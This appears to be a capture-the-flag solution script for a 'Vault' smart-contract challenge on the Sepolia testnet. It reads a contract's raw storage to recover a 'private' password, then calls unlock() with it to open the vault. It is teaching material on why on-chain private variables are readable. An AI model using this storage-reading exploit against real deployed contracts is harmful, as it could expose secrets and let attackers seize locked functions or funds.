# 09-Vault
```
async function main() {
    const contractAddress = VAULT_ADDRESS;
    const reader = new StorageReader(contractAddress);

    console.log('=== Reading Contract Storage ===\n');

    // 读取前 10 个 slots
    console.log('Basic slots:');
    await reader.readSlots(0, 10);

    console.log('\n=== Parsing Storage ===\n');

    // Slot 0: bool public locked
    const locked = await reader.readSlot(0);
    const isLocked = BigInt(locked) === 1n;
    console.log('Locked:', isLocked);

    // Slot 1: bytes32 private password
    const passwordBytes = await reader.readSlot(1);
    console.log('Password (hex):', passwordBytes);

    // 解码为 ASCII 字符串
    const passwordStr = Buffer.from(passwordBytes.slice(2), 'hex')
        .toString('utf8')
        .replace(/\0/g, ''); // 移除 null bytes 
    console.log('Password (string):', passwordStr);

    console.log('\n=== Unlocking Vault ===\n');

    // 调用 unlock(bytes32 password)
    const { createWalletClient } = await import('viem');
    const { privateKeyToAccount } = await import('viem/accounts');

    const account = privateKeyToAccount(PRIVATE_KEY);
    const walletClient = createWalletClient({
        account,
        chain: sepolia,
        transport: http(RPC_URL),
    });

    const unlockAbi = [
        {
            "inputs": [{"internalType": "bytes32", "name": "_password", "type": "bytes32"}],
            "name": "unlock",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        }
    ];

    console.log('Calling unlock() with password:', passwordBytes);
    const tx = await walletClient.writeContract({
        address: VAULT_ADDRESS,
        abi: unlockAbi,
        functionName: 'unlock',
        args: [passwordBytes]
    });

    console.log('Transaction hash:', tx);

    // 等待确认
    const receipt = await client.waitForTransactionReceipt({ hash: tx });
    console.log('Transaction status:', receipt.status === 'success' ? '✓ Success' : '✗ Failed');

    // 验证是否已解锁
    console.log('\n=== Verification ===\n');
    const lockedAfter = await reader.readSlot(0);
    const isLockedAfter = BigInt(lockedAfter) === 1n;
    console.log('Locked after attack:', isLockedAfter);

    if (!isLockedAfter) {
        console.log('\n✓✓✓ Vault unlocked successfully!');
        console.log('Lesson: "private" variables are NOT private on blockchain!');
    } else {
        console.log('\n✗ Unlock failed');
    }
}
```